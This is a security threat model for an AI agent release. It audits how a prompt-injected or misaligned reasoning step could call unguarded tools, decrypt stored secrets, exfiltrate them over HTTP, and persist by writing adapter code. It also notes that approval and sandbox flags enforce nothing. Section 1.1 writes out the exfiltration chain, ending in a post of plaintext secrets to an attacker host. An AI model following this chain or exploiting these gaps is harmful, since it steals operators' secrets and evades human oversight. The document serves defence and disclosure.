# Threat model — CIRISAgent 2.9.7

**Status:** consolidated security posture for the 2.9.7 release.
**Scope:** the agent process and what its own reasoning loop can reach. Not the
federation wire (`FSD/TRACE_WIRE_FORMAT.md`), not the substrate wheels
(CIRISConformance owns those), not the deployment perimeter.
**Sources reconciled:** `FSD/TASK_ENVELOPE.md`, `FSD/BUDGET_ENVELOPE.md`,
`FSD/HITL_APPROVAL_SURFACE.md`, `FSD/CLI_TOOLS_DESKTOP.md`, `compliance/`.

Every claim below is grounded in a file and line on `release/2.9.7`. Where a
claim could not be verified it is marked **UNVERIFIED** and says why, rather
than being dropped or asserted.

---

## 0. The one-paragraph version

2.9.7 ships **one new deterministic control** — the budget envelope on spend —
and a substantial amount of **plumbing for a control that does not exist yet**:
TaskEnvelope Phase 1 issues an authorization envelope for every task and puts it
in front of the tool-execution seam, but **nothing reads it to deny anything**.
Between those two facts sits a gap that this document exists to state plainly:
the agent's protection against a misaligned or manipulated reasoning step is,
for every capability except spend, **semantic** — a model or a conscience
reasoning about content — and the most commonly cited "control" in the codebase
and its documentation, `ToolDMAGuidance(requires_approval=True)`, **enforces
nothing at all**.

The single most important sentence for a reader who stops here:

> **A model that selects a tool executes that tool.** There is no interception
> between action selection and dispatch, on any path, for any tool, other than
> `send_money`.

---

## 1. What a misaligned reasoning step can do today

This section assumes no process compromise and no malicious operator. It assumes
only that **the model selects a tool call that it should not**, whether through
prompt injection from an inbound message, a jailbreak, distributional drift, or
ordinary error. That is the threat this release's design work was aimed at, and
it is the right one to measure against.

Against a default deployment (the `api` adapter, which `main.py` defaults to and
which `ciris_engine/cli.py:139` launches for desktop), the reasoning loop can:

| # | Capability | Reachable via | Gate |
|---|---|---|---|
| 1 | **Issue arbitrary HTTP requests to any host, with attacker-chosen method, headers and body** | `curl` / `http_get` / `http_post`, registered at `logic/adapters/api/api_tools.py:37-41`; request issued at `:142` | **None.** No URL validation of any kind. |
| 2 | **Decrypt any secret in the store, by UUID** | `recall_secret` → `core_tool_service/service.py:197-223` → `logic/secrets/service.py:419` | **None.** No task, channel or user scope. |
| 3 | **Read the UUIDs of the 10 most recently stored secrets, deployment-wide** | `logic/context/secrets_snapshot.py:26-30`, injected into every prompt | **None.** Not filtered by task, channel or user. |
| 4 | **Move money** | `send_money` → `ciris_adapters/wallet/tool_service.py:681` | ✅ **Deterministic, fail-closed** — the budget envelope (§3.1). |
| 5 | **Moderate a channel** (kick/ban) | Discord tool service | Semantic only (§3.2). |
| 6 | **Execute arbitrary shell commands; write arbitrary files** | `shell_command` / `write_file`, `cli_tools.py` | **None** — but requires a run that explicitly loads the `cli` adapter (§4.4). |

### 1.1 The chain that matters

Items 1–3 compose into a complete, unguarded exfiltration path that needs
**only the default adapter** and no unusual configuration:

```
build_secrets_snapshot()                    secrets_snapshot.py:26-30
  → list_all_secrets(), 10 most recent, NO task/channel filter
  → UUIDs land in SystemSnapshot.detected_secrets → the prompt
        ↓
recall_secret(uuid, decrypt=True)           core_tool_service/service.py:208-213
  → retrieve_secret(uuid), NO authorization check
  → plaintext returned to the reasoning loop
        ↓
http_post(url=<attacker>, data=<plaintext>) api_tools.py:142
  → no URL validation, no egress allow-list
```

Every step is granted to every task by the deployment-scoped envelope, **by
design** (§2.3). Nothing in 2.9.7 gates any step. The only thing between an
injected instruction and a decrypted secret leaving the host is the conscience
layer's judgement about the action — which is real, and is not deterministic.

This chain is the honest headline of this release's security posture and it is
not stated in any of the four feature FSDs, because each was written about its
own mechanism and none of them owns all three links.

> **One field-description defect found while verifying this.**
> `SystemSnapshot.detected_secrets` is documented at
> `schemas/runtime/system_context.py:98-100` as *"Patterns of secrets detected in
> current context (masked representations)"*. It is none of those three things:
> `secrets_snapshot.py:30` puts **raw UUIDs**, of **all** recently-stored
> secrets, **not scoped to the current context**. The description overstates the
> safety of the field by every available axis.

---

## 2. The control taxonomy

The central confusion this document exists to remove is that CIRIS's
documentation has not consistently distinguished three very different things.
Read every security claim in this repo against this table.

| Class | Definition | Trustworthy against a misaligned model? |
|---|---|---|
| **Deterministic** | Code returns a denial. Not reachable by persuasion. | Yes, within its stated scope. |
| **Semantic / model-mediated** | A model or conscience evaluates content and may choose to stop. | **Partially.** It is a real control with a real pass rate; it is not a boundary. Its failure mode is silent. |
| **Documentation-only** | A declared field, config key or comment that describes a control. No code reads it. | **No.** Worse than nothing, because it is *read as* a control by contributors and auditors. |

### 2.1 Deterministic controls that exist

| Control | Where | Scope |
|---|---|---|
| Budget envelope on spend | `wallet/tool_service.py:733-773` → `governance/budget_envelope.py:259` | `send_money`, every rail. Denies by default. |
| Grant signature verification | `governance/budget_envelope.py` fail-closed ladder | Signed grants only; unsigned grants are honored in unsigned deployments. |
| AUTHORITY role on grant issuance | `routes/tickets.py` | ADMIN (level 2) is insufficient. |
| Reserved-metadata-key refusal | `create_ticket` / `update_ticket` | Blocks the agent minting its own grant, dict *and* JSON-string forms. |
| Reasoning-scope mint guard | `infrastructure/authorization/reasoning_scope.py`; raises `EnvelopeIssuanceForbidden` at `envelope_issuer.py:72-81` | Blocks envelope **minting** inside the reasoning loop. Not a tool gate. |
| SSRF guard | `api_document.py:39`, called at `:302` | **One** call site (§4.5). |
| Platform predicate | `utils/platform_detection.py:87-96` | Positive allow-list; fails closed on unknown. |
| Ticket-status filter | `work_processor.py` | A proposal never becomes an executing task on its own. |

### 2.2 Semantic controls (real, not boundaries)

The four epistemic consciences, the `DEFER` action routing to Wisdom-Based
Deferral, the PDMA/ASPDMA cascade, and the guidance prose rendered into the
action-selection prompt. These carry **almost the entire load** for every
consequential capability except spend.

They are genuinely load-bearing and this document does not disparage them. But
three properties must be stated:

- They are **stochastic**. They have a pass rate, not a guarantee.
- They **fail silently**. A conscience that does not fire looks exactly like a
  conscience that correctly declined to fire.
- They are **in-band**. The same channel carrying the attack carries the
  content the conscience reasons about.

### 2.3 Documentation-only "controls" — the inert set

Each of these reads as a control and enforces nothing.

| Field | Declared | Readers | Issue |
|---|---|---|---|
| `ToolDMAGuidance.requires_approval` | `schemas/adapters/tools.py:172` | 2, neither gating (§4.1) | #942 |
| `ToolDMAGuidance.min_confidence` | `schemas/adapters/tools.py:171` | **0** — not even rendered into the prompt | #942 |
| `ToolDMAGuidance.followup_actions` | `schemas/adapters/tools.py` | **0** | #942 |
| `ToolHandlerData.sandbox_mode` | `schemas/handlers/context.py:38`, `default=True` | **0** | #943 |
| `ToolHandlerData.requires_confirmation` | `schemas/handlers/context.py:37` | **0** | #943 |
| `DeferralResponse.signature` | `schemas/services/authority_core.py:260` | **0** — written as a formatted string, never read | #944 |
| `Task.signature` | written by `sign_task`, `persistence/models/tasks.py:608-611` | `verify_task_signature` has **0 production callers** | #944 |
| `IdentityUpdate.requires_approval` | `schemas/runtime/core.py:122`, `default=True` | **0** — the whole model has no production consumer | — |
| `WalletAdapterConfig.spending_limits.session_limit` | `wallet/config.py:25` | **0** on the agent spend path | — |

`ToolHandlerData.sandbox_mode` deserves its reputation as the canonical
instance: it is named `sandbox_mode`, it defaults to `True`, and there is no
sandbox. Both `FSD/TASK_ENVELOPE.md` §7 and `FSD/BUDGET_ENVELOPE.md` cite it as
the failure they exist to avoid repeating — correctly. Note that its neighbour
`requires_confirmation` (`:37`) is inert too: **`ToolHandlerData` is a schema of
three security-sounding fields, none of which is read by anything.** Reading that
class is the fastest way to understand the shape of this problem.

> **A precision on "fail-open".** These are not fail-open controls; they are
> **absent** controls. A fail-open control runs and yields on error. These never
> run. The distinction matters because a fail-open control at least appears in a
> trace when it yields, and an absent one never appears anywhere. Genuine
> fail-open instances are catalogued separately in §5.

---

## 3. What each new mechanism does — and does not — cover

### 3.1 Budget envelope (#938/#939) — the one real gate

**Does:** denies `send_money` unless a human holding AUTHORITY has issued a
budget grant bound to the originating ticket, and the amount is within both that
grant and the deployment's trust envelope. Placed at
`wallet/tool_service.py:733-773`, ahead of `provider.send(...)` — the single
point every rail converges through. Fail-closed at every step
(`governance/budget_envelope.py:273-296`): no task ⇒ `NO_TASK_CONTEXT`, no ticket
⇒ `NO_TICKET_FOR_TASK`, no grant ⇒ `NO_GRANTED_BUDGET`, corrupt ledger reads as
exhausted rather than zero-spent.

**Does not:**
- **Cover `/v1/wallet/transfer`.** `routes/wallet.py:674-679` requires ADMIN and
  calls `provider.send()` directly with no `authorize_spend` call. **Agent spend
  is gated; human spend is not.** By design, but "all spend is gated" is false.
- **Bind a currency to the trust envelope.** `SpendingLimits.max_transaction` and
  `.daily_limit` are unit-less `Decimal`s (`wallet/config.py:17-24`), so
  `max_transaction=100` means "100 of whatever is being sent". 100 USDC and
  100 KES both pass.
- **Survive a restart or span occurrences, on the outer envelope.**
  `SpendingTracker` is in-memory. N occurrences give N× the daily limit against
  one shared wallet. (The *inner*, per-ticket ledger is persisted and shared.)
- **Give fiat rails a daily accumulator.** No tracker ⇒ `daily_remaining` falls
  back to the configured ceiling each call.
- **Make the approval wise.** A human who approves a harmful spend has authorized
  a harmful spend.

> **A claim in the source brief for this document, corrected.** The premise
> "`send_money` is ungated on fiat rails" was **true before this release and is
> now false**. `_execute_send_money` gates every rail, and the all-rails test
> parametrizes over the provider modules rather than trusting an enumeration.
> This is the release's genuine security win and it should not be understated.
> What remains true is the *human* route, `/v1/wallet/transfer`.

### 3.2 TaskEnvelope Phase 1 (#938) — subject, not gate

**Does:** resolves an immutable, non-wildcardable envelope per task; stores it in
the task row so it survives restart and is visible across occurrences; threads a
`ToolInvocationSubject` to the bus; routes context enrichment through
`ToolBus.dispatch_to_provider` so Phase 2 has one seam instead of two; makes
task identity handler-authoritative (`b8aeebfaf`); and blocks the reasoning loop
from *minting* an envelope.

**Does not — and this is the crux of the release:**

> **Nothing enforces the envelope. Verified definitively.**
> `ToolBus.dispatch_to_provider` (`logic/buses/tool_bus.py:240`) calls
> `_note_subject(...)` at `:265` and then `service.execute_tool(...)`
> **unconditionally** at `:272`. Nothing sits between them. `_note_subject`
> (`:95-117`) only emits a `logger.debug` naming the subject, or a once-per-caller
> `logger.warning` when it is absent. It returns `None`; no caller branches on
> it. `execute_tool` (`:119`) touches `subject` once, at `:185`, inside the
> NOT_FOUND branch, then forwards it verbatim.
>
> The fail-closed predicates *exist* — `envelope_permits_tool(None, x) is False`
> at `schemas/runtime/task_envelope.py:552` — and have **zero production
> callers**. They are asserted in tests and never evaluated at runtime.
>
> `handlers/external/tool_handler.py:98-104` says so itself: on a missing
> envelope it logs, at `debug`, text reading *"tool call proceeds unauthorized
> (Phase 1 has no gate)"*.

**Also does not:**
- **Deliver least privilege.** `granted_tools` is populated from
  `prime_enabled_tools` (`envelope_issuer.py:153` → `enabled_tools.py:99`), which
  accepts **every** name the live `ToolBus.get_all_tool_info()` returns, and
  `capabilities` is set to `ALL_TOOL_CAPABILITIES` (`envelope_issuer.py:168`).
  Issuance takes no task-purpose argument. **The envelope is identical for every
  task in a deployment.** This is correct — task type is unknowable at creation,
  and pre-authorizing by type guarantees the one task that needed the ban is the
  one that could not issue it — but it means the envelope shrinks nothing today.
- **Ship a narrowing policy.** `attenuate_envelope` (`envelope_issuer.py:299`)
  has zero production callers; only tests call it.
- **Gate CommunicationBus, MemoryBus or LLMBus.** Outward messages, memory writes
  and context egress carry the same argument and are uncovered.
- **Cover every task-creation site.** Dream tasks, partnership tasks,
  `try_claim_shared_task`, `add_system_task` and WA guidance tasks are not wired.
  Inert today; under Phase 2 they would all deny.
- **Constitute a sandbox.** §6.

### 3.3 HITL approval surface (#938) — visibility, not enforcement

**Does:** gives every pending human decision one list, a session-wide badge,
at-most-once notifications, and a budget request rendered as a budget request
with a ratio-named confirmation on over-grants.

**Does not:** enforce anything. It is a client. The AUTHORITY role, the trust
ceiling and spend-against-grant are all server-side. A modified client changes
nothing. It also cannot make a deferral resolution attributable, because the
server cannot (§4.2).

**Newly recorded constraint:** the two over-grant strings carry an RTL bidi
hazard — if `{ratio}` and `{requested}` ever become separated by neutrals alone,
the two figures render in swapped visual order in `ar`/`fa`/`ur`, on the money
dialog, silently. It holds today only by phrasing. Recorded in
`FSD/HITL_APPROVAL_SURFACE.md` and at the Kotlin call site; not machine-checked.

### 3.4 CLI host tools on desktop (#941) — a capability, honestly declared

**Does:** grants `shell_command`, `write_file`, `search_text` on a recognized
desktop platform, via a fail-closed positive allow-list
(`platform_detection.py:87-96`), with automatic and platform-correct disclosure
in the first-run wizard.

**Does not:** gate, sandbox, rate-limit or path-restrict any of it.
`shell_command` runs `asyncio.create_subprocess_shell` with the agent process's
full permissions. #909 remains open.

**Scope precision:** the grant needs `is_desktop()` **and** the `cli` adapter to
be loaded, and the shipped desktop entry point launches `--adapter api`
(`cli.py:139`, `:237-241`). So a default desktop install does **not** get shell.
Say *"a desktop run that loads the `cli` adapter"*, never *"desktop installs"*.

---

## 4. Named defects, with evidence

### 4.1 `requires_approval` is prompt text, not a gate (#942)

Two read sites, exhaustively:

1. `logic/dma/tsaspdma.py:247-248` — appends
   `**⚠️ Requires wise authority approval**` to the action-selection prompt.
2. `logic/services/tool/tool_disclosure.py:118-119` — appends a
   `REQUIRES_APPROVAL` capability flag to the first-run consent disclosure.

No handler, bus, conscience or deferral path branches on it. Two shipped tools
set it — `shell_command` (`cli_tools.py:492`) and `send_money`
(`wallet/tool_service.py:183`) — and it has never gated either. Skills generated
by the skill-import wizard default it to `True`
(`skill_import/builder.py:348`, codegenned at `:533`), into the same dead field.

**The second site is the more serious one, and it was previously uncounted.** It
is *operator-facing*: the setup wizard renders `tool_cap_requires_approval` as
**"Marked as needing wise-authority approval before it is used."** The wording
hedges correctly — *marked as* — but it appears on a consent screen, next to
`shell_command` and `send_money`, and an operator giving informed consent will
reasonably read it as a control. This is the inert flag escaping from a prompt
into a human safety representation.

**Documentation corrected in this pass** (all previously asserted the flag
gates execution): `CLAUDE.md`, `ciris_adapters/README.md:249`,
`FSD/ADAPTER_DEVELOPMENT_GUIDE.md:245` (*"the Wise Authority deferral workflow
triggers before execution"* — the strongest and most explicit of them),
`FSD/WALLET_ADAPTER.md:29`, `FSD/WALLET_REGULATORY_COMPLIANCE.md:199`
(*"ensures no automated spending without explicit user intent"* — the most
consequential, since it is a compliance document making a guarantee about
money), and `compliance/D19_partner_role.md:66` (*"the partner-role financial-tool
gate"*).

### 4.2 WA deferral resolutions are unsigned; task signatures are unverified (#944)

**Two independent defects**, frequently conflated:

- **`DeferralResponse.signature` is never a signature.**
  `routes/wa.py:183` sets
  `signature=f"api_{auth.user_id}_{datetime.now(timezone.utc).isoformat()}"`.
  The field is a plain `str` with no validator
  (`schemas/services/authority_core.py:260`). Nothing reads it: both
  `resolve_deferral` implementations
  (`governance/wise_authority/service.py:530`,
  `adapters/discord/discord_adapter.py:691`) ignore it. `GuidanceResponse.signature`
  is hardcoded `""` at `wise_authority/service.py:870` and `:891`.
- **`Task.signature` is a real Ed25519 signature that is never checked.**
  Written by `sign_task` (`persistence/models/tasks.py:608-611`);
  `verify_task_signature` (`authentication/service.py:1515`) has **zero
  production callers** — only the protocol declaration, a capability-advertisement
  string at `:211`, and three test callers.

The route *is* authorization-gated (`require_authority`, `wa.py:164`) and the
account *is* recorded. What is absent is **non-repudiation**: an operator cannot
be cryptographically bound to a decision, and a decision cannot be attributed to
a key. `compliance/D23_accountability.md` claimed the opposite in two places and
was corrected in this pass.

Note the asymmetry the codebase already understands: the **budget grant**
signature *is* verified, on every spend. `FSD/BUDGET_ENVELOPE.md` explicitly
declined to route money over the deferral path because that path's signature is
theatre. The right fix for #944 is to make deferrals look like grants.

### 4.3 Secrets have no task scope (#940)

- `recall_secret` (`core_tool_service/service.py:197-223`) calls
  `retrieve_secret(uuid)` with **no authorization check of any kind**. Note it
  retrieves the plaintext in *both* branches (`:209`, `:217`) and only varies
  whether it returns it — so `decrypt=False` is an output filter, not a
  privilege boundary.
- `logic/secrets/service.py:419` likewise performs no scope check; `purpose` is
  a caller-supplied audit string, i.e. model-chosen.
- `logic/context/secrets_snapshot.py:26-30` calls `list_all_secrets()`,
  deployment-wide, and ships the 10 most recent UUIDs into every prompt with no
  task, channel or user filter.

### 4.4 Write-then-load is live again, and reaches further than documented

`FSD/CLI_TOOLS_DESKTOP.md` §6 correctly names this as newly real. Two
corrections landed in this pass:

- **Timing.** It is not only "on the next runtime start".
  `dma/action_selection/context_builder.py:58-65` constructs a fresh
  `AdapterDiscoveryService()` and awaits `get_discovery_report()` **while
  building action-selection context**, descending to
  `importlib.import_module(...)` (`services/tool/discovery_service.py:253`) and
  `service_class(**deps)` (`:478`). Nothing on that path checks
  `auto_load_adapters`. Import — and therefore module-level code execution —
  happens inside the reasoning loop.
- **Provenance.** There is no trust gate at all.
  `_should_skip_for_auto_load` (`discovery_service.py:341-372`) reads
  `auto_load` / `requires_consent` / `opt_in_required` **out of the manifest the
  attacker just wrote**. `ToolEligibilityChecker` checks binaries, env vars,
  platform and config keys — no signature, hash or origin check anywhere.

Two honest bounds, so this is not overstated: `sys.modules` caching means an
already-imported module is not re-read in-process, and `write_file` is a bare
`open(path, "w")` (`cli_tools.py:209`) that cannot create parent directories, so
a *new* adapter directory needs a `mkdir` — i.e. `shell_command`. But
`DISCOVERY_PATHS[0]` and `[1]` (`discovery_service.py:53-56`) are the installed
and cwd `ciris_adapters/` trees, which always exist, so adding or overwriting a
file there needs no shell.

**Weighting:** where `shell_command` is available, this is not the *first* code
execution — `shell_command` already is. Its significance there is **persistence
and privilege**: the dropped adapter survives restart and is registered inside
the agent's own service graph as a `ServiceType.TOOL` / `WISE_AUTHORITY` provider
(`service_initializer.py:1623-1664`), where the bootstrap path injects
`secrets_service`, `memory_service` and `bus_manager` (`:1938-1946`). Where only
`write_file` is available, it *is* a code-execution primitive.

### 4.5 The SSRF guard protects one field; the fetches that matter are elsewhere

`validate_url_for_ssrf` (`api_document.py:39`) is **well built** — blocked-host
list, scheme check, private/loopback/link-local rejection, explicit
`169.254.0.0/16` block, IP-pinning against DNS rebinding (`:315`), redirects
disabled and manually re-validated (`:331-347`), size caps.

It has **one production caller**: `api_document.py:302`, inside
`_download_document`. Its entire blast radius is the `documents[]` field of
`POST /v1/agent/interact`.

**Unguarded fetches, all reachable without it:**

| Site | Path | Note |
|---|---|---|
| `adapters/base_vision.py:109-110` | inbound Discord attachment | observation-time |
| `adapters/base_vision.py:150-151` | embed `image.url` / `thumbnail.url` | **attacker-influenced** — Discord derives these from the `og:image` of any posted link |
| `adapters/document_parser.py:197-201` | inbound document | redirects left enabled |
| `adapters/api/api_tools.py:142` | `curl` / `http_get` / `http_post` | agent tool; arbitrary method, URL, headers, body |

**The first three run upstream of every gate.** Ordering is explicit in
`adapters/base_observer.py` `handle_incoming_message`:

```
:893  processed_msg = await self._enhance_message(processed_msg)   ← NETWORK FETCH
:905  filter_result = await self._apply_message_filtering(...)      ← adaptive filter
:940  obs_result = await self._handle_passive_observation(...)      ← task creation
```

The fetch precedes the adaptive filter, task creation, the DMA cascade, and any
conceivable tool gate. **A Phase 2 tool gate cannot cover it**, because no tool
is involved — it is observation. Any claim that "Phase 2 gates the agent's
network egress" must exclude this path.

One nuance so this is not misread: `api_vision.py:113-119` deliberately does
*not* fetch API-supplied image URLs — it stores `source_type="url"` and hands the
raw URL to the LLM provider (`:138-140`). That does not eliminate the fetch; it
**relocates it to the provider's egress**. Images on the API path are not "safe",
they are someone else's SSRF surface.

### 4.6 Three of four #938 bypass paths remain open

| # | Bypass | Status |
|---|---|---|
| 1 | Context enrichment invoked directly on the service instance, bypassing `ToolBus`, on every thought | **Closed** — routed through `dispatch_to_provider`. Residual: startup-cache population still falls back to direct invocation when no bus exists, and logs it. |
| 2 | `DiscordAdapter.execute_tool` → `_tool_handler.execute_tool` (two aliases of one surface) | **Open** |
| 3 | `curl`/`http_get`/`http_post` free with the API adapter | **Open** — and this is the default adapter |
| 4 | Write-then-load into `AdapterDiscoveryService.DISCOVERY_PATHS` | **Open, newly reachable** (§4.4) |

The numbering originates in the #938 gate-placement thread and has **no in-repo
artifact**; it is reproduced identically in `FSD/TASK_ENVELOPE.md` §0 and
`FSD/CLI_TOOLS_DESKTOP.md` §6 so the documents agree.

---

## 5. Genuine fail-open instances

Distinct from the inert set in §2.3: these controls *run* and yield a permissive
answer.

| Site | Behaviour | Precision |
|---|---|---|
| `routes/system/helpers.py:96-102` `check_initialization_status` | Returns `True` when the init service is absent or lacks `is_initialized` | Fails open on **absence**, not on exception — there is no `try/except`; an exception inside `is_initialized()` propagates. An unwired init service reports the system fully initialized and healthy (`health.py:178-195`). |
| `routes/system/helpers.py:110-122` `check_provider_health` | Returns `True` ("assume healthy if no method"), with a bare `except Exception` | Fail-open on both absence and error. |
| `utils/platform_detection.py:130` | `GOOGLE_PLAY_SERVICES_AVAILABLE` defaults `"true"` ⇒ `ANDROID_PLAY_INTEGRITY` claimed | Fails open by **unconditional assumption**, not by error handling — no `try/except` exists in the file. Play Integrity is asserted with zero attestation performed. Sharpest instance. |
| `utils/platform_detection.py:122`, `:156` | `ANDROID_KEYSTORE` / `SECURE_ENCLAVE` added unconditionally per-OS | Same shape. Contrast `:160`–`:203`, where every other capability defaults absent, i.e. fails closed. |
| `routes/_adapter_discovery.py:49-50` | `except ValueError: pass  # Unknown requirement, skip` | Fails **closed** on exception (`:52-53` returns `False`) but open on an unrecognized requirement string — a typo'd or future requirement silently drops out of the check. |

`WalletAdapterConfig.spending_limits` was previously cited as fail-open. **That
is now stale in a good way:** it was an instance of the *inert* pattern (declared,
zero readers) and #939 made it load-bearing —
`wallet/tool_service.py:447-484` reads it, and its defaults are finite
(`100`/`1000`, `wallet/config.py:17-24`), so an unconfigured deployment gets a
bounded rather than unbounded envelope. Its `session_limit` sibling still has no
reader on the agent path.

---

## 6. What "the reasoning path cannot mint an envelope" actually proves

`FSD/TASK_ENVELOPE.md` §5 is already honest about this and it is repeated here
because it is the most over-readable claim in the release.

**Proven:** every mint entry point raises `EnvelopeIssuanceForbidden` inside the
reasoning scope, including from `asyncio.create_task` children; `ActionDispatcher`
really sets the marker (verified by execution, not by reading source); no module
under `logic/dma/`, `logic/conscience/` or `logic/handlers/` imports the issuer.

**Not proven, and not provable in this architecture:** this is one Python
process. Anything that can `import` can reach anything. The import scan is
static and `importlib.import_module` slips past it. A future processor that
dispatches without entering the scope evades the marker entirely. Nothing stops
a direct `contextvars` reset.

**The honest claim:** an *accidental* mint from the reasoning path fails loudly,
and a *deliberate* one cannot be added without changing a file these tests watch.
**It is not a sandbox and must not be described as one.** A real boundary is
process separation.

The same reasoning applies to the datastore. The envelope lives in the task row,
and the reasoning loop can write task rows — `conscience/updated_status_conscience.py:140`
does a read-modify-write inside the conscience layer today. It is currently safe
by construction, and locked by a test, but it is a write.

---

## 7. Residual — the honest summary

Ordered by what an attacker would actually reach for.

1. **Unrestricted HTTP egress from the default adapter.** No URL validation, no
   allow-list, arbitrary body. This is both the exfiltration channel for §1.1 and
   an SSRF primitive against everything the agent host can route to, including
   cloud metadata endpoints — which the *guard that exists* blocks and this path
   never consults. **The single highest-value fix in this document.**
2. **Unscoped secrets.** Any UUID, any task, plus cross-task UUIDs delivered into
   every prompt. Combined with (1), a complete chain.
3. **No tool gate at all.** TaskEnvelope built the seam and Phase 2 has not
   landed. Every capability except spend is defended only semantically.
4. **Observation-time fetches upstream of everything.** Structurally outside the
   reach of any tool gate, including the one Phase 2 will add.
5. **Unsigned WA resolutions.** The human-oversight surface cannot prove who
   exercised it, which weakens every compliance claim that rests on human
   accountability.
6. **Write-then-load, in-process, with no provenance check.** Persistence and
   privilege escalation into the agent's own service graph.
7. **Human spend path ungated.** By design, but load-bearing on operator
   discipline.
8. **The inert set is still inert**, and one member of it is now rendered to
   operators on a consent screen in 27 languages.

### What would move the needle most, in order

1. Route `curl`/`http_get`/`http_post` through `validate_url_for_ssrf` — the
   guard already exists and is good. This is a small change with the largest
   effect in this document.
2. Give `recall_secret` a task scope, and filter `build_secrets_snapshot` by the
   current task/channel.
3. Land Phase 2 (#905 Ask 1) at `dispatch_to_provider`, clearing the named
   blockers first (cold-cache issuance, unwired task-creation sites).
4. Sign WA resolutions and verify on read (#944), copying the grant path.
5. Route the observation-time fetches through the guard.

---

## 8. Explicitly out of scope / UNVERIFIED

Stated rather than silently omitted.

- **The substrate wheels.** `ciris-persist`, `ciris-edge`, `ciris-verify` and the
  audit chain are verified by CIRISConformance against published wheels; see
  `compliance/README.md`. **UNVERIFIED here** — this document did not re-check
  them, and no CI lane in this repo re-checks them either.
- **The four sub-checks formerly claimed on the wallet send path** —
  "attestation check", "recipient validation", "duplication detection" — were
  asserted in `FSD/WALLET_REGULATORY_COMPLIANCE.md` §6.1 as steps in the send
  pipeline. **UNVERIFIED.** They do not appear in the authoritative fail-closed
  ladder in `FSD/BUDGET_ENVELOPE.md`. Routes named `/validate-address` and
  `/check-duplicate` exist (`routes/wallet.py:817`, `:976`) but are *human* API
  endpoints; whether anything on the agent path calls equivalent logic was not
  established. That document has been marked accordingly; do not cite them as
  implemented controls.
- **Prompt-injection resistance of the conscience layer.** Measured by the QA
  sweeps, not by this document. No claim is made here about its pass rate.
- **The 27-language disclosure strings.** Verified present for 27 of 29 locales
  (`my` and `yo` carry none of the approval keys and fall back to English);
  **translation quality UNVERIFIED**.
- **Multi-occurrence race conditions** in envelope issuance and ticket claiming.
  Not examined.
- **The desktop/iOS test-mode HTTP server** (`CIRIS_TEST_MODE`), which exposes
  `/click`, `/input` and `/screenshot`. Not examined; it is opt-in via env var
  and off by default.

---

## 9. How to keep this document true

- Any doc claiming a control **must** say which class in §2 it belongs to.
- Any new `Field(...)` that names a safety property **must** have a reader in the
  same PR, or say in its description that it has none.
- If you are about to write "gated", "requires approval", "sandboxed" or
  "signed", find the line that returns the denial or performs the verification
  first. Five of the six documentation defects corrected in this pass were of
  exactly that shape.
